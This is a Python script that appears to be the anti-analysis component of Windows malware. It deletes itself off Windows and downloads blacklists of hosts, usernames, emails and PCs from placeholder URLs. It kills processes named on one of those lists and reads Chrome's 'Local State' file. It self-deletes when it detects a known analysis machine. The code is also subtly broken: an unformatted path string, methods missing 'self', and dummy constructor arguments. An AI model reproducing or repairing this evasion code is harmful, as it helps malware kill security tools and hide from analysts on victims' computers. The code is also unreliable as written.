import os
import sys
if  (__name__ == "__main__" and sys.platform == "win32" and os.name == "nt"):
  pass
else:
  os.remove(__file__)
import getpass
import requests
import string
import socket
import winreg
import psutil
import cython
import re
import json
from pathlib import Path
import win32api
import win32net

#we will use void_esc() function to remove the ffile or sys.exit()
def void_esc() -> None:
  #if try works then we will remove the file
  try:
    os.remove(__file__)
  #else we will exit the program
  except:
    sys.exit()

try:
  #we try to get user of the computer and host by using socket library
  host: str = socket.gethostname()
  user: str = socket.gethostbyname(host)
#else we will exit using void_esc() function
except:
  void_esc()

#alphabet will take all the ascii uppercase
alphabet: str = string.ascii_uppercase

#user_name will get the user of the pc
user_name: str = getpass.getuser()

#we will make a requests(http request) to get the raw text 
ip6 = requests.get(r"url").text #GET URL
desktops = requests.get(r"url").text #GET URL
ant = requests.get(r"url").text #GET URL
emails = requests.get(r"url").text #GET URL
usernames = requests.get(r"url").text #GET URL
pcs = requests.get(r"url").text #GET URL

class debugs:
  def __init__(self,ip_addresses_ipv6,list_of_desktops,list_of_ant,list_of_emails,list_of_username,list_of_pcs) -> None:
    #we will get a list of any requests that we want to make to store in them
    self.ip_addresses_ipv6 = ip_addresses_ipv6
    self.list_of_desktops = list_of_desktops
    self.list_of_ant = list_of_ant
    self.list_of_emails = list_of_emails
    self.list_of_username = list_of_username
    self.list_of_pcs = list_of_pcs

  def processing() -> None:
    #process will store are the psutil.process_iter()
    for process in psutil.process_iter():
    #we will check process.name if it is in ret.list_of_ant
     if process.name() in ret.list_of_ant:
       try:
        #we will kill the process
        process.kill()
        #otherwise we will exit the program
       except:
        void_esc()
  
  
  def desk() -> None:
    #checks the matching between host and ret,list_of_desktops(that will store a couple of names of desktops) 
    if str(host) in str(ret.list_of_desktops):
      #we will try to use void_esc() function
      try:
        void_esc()
      #else we will exit the program
      except:
        sys.exit()

  def scan() -> None:
    try:
       #we will try to change the directory 
       os.chdir("C:\\Users\\{user_name}\\AppData\\Local\\Google\\Chrome\\User Data")
       #we will change the Local State extension to .json
       p = Path('Local State')
       p.rename(p.with_suffix('.json'))
       #we will store the json files into data
       data = json.load(open('Local State.json'))
       LocalState_file = Path('Local State.json')
       #we will change the Local State extension to none
       LocalState_file.rename(LocalState_file.with_suffix(''))
       #we will make a regex between them
       x = re.search(str(data),str(ret.list_of_emails))
    except:
      pass
    #if it is any match we will try to use void_esc()
    if x:
      try:
        void_esc()
      #else we will exit the program
      except:
        sys.exit()

  def win32_apis() -> None:
    #username will get the username of the pc by using win32api library function
    username:str = win32api.GetUserName()
    #we will get the computername by using win32api library function
    computer_name:str = win32api.GetComputerName()
    #we will check if their is any match between username and ret.list_of_username
    if(str(username) in str(ret.list_of_username)):
      #if it is we are gonna use void_esc() function
      try:
        void_esc()
      #else we will use sys.exit()
      except:
        sys.exit()
    #we will try to get information about the computer using NetUgerGetInfo at a scale of level 3
    user_info:dict = win32net.NetUserGetInfo(computer_name, username, 3)
    #we will make a regex search between them
    scan = re.search(str(user_info),str(ret.list_of_pcs))
    #if it is any match we will try use void_esc()
    if scan:
      try:
        void_esc()
      #else we will exit the program
      except:
        sys.exit()
  
#ret will get the arguments of the list(__init__)
ret = debugs('1','2','3','4','5','6')

if __name__ == "__main__" and sys.platform == "win32" and os.name == "nt":
  debugs.processing()
  debugs.desk()
  debugs.scan()
  debugs.win32_apis()
